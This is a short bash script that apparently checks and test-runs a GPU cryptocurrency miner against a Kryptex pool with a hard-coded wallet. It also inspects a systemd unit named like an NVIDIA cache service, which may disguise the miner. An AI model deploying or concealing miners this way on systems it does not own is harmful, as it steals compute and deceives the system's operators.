#!/bin/bash
W='prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz'
echo "=== date $(date -u) host $(hostname)"
nvidia-smi --query-gpu=name,driver_version,memory.total,compute_cap --format=csv,noheader 2>&1
ls -la /opt/fleet/krig/ 2>&1 | head
/opt/fleet/krig/krig-miner --version 2>&1 | head -3
ldd /opt/fleet/krig/krig-miner 2>&1 | grep -i 'not found' | head
echo "=== run 25s"
timeout 25 /opt/fleet/krig/krig-miner --coin pearl -d 0 --url stratum+ssl://prl.kryptex.network:8048 --user $W/ul-ps-test-g0 --password x --no-tui --no-telemetry -l info 2>&1 | tail -40
echo "=== units"
systemctl status nv-cuda-cache@0 --no-pager 2>&1 | tail -12
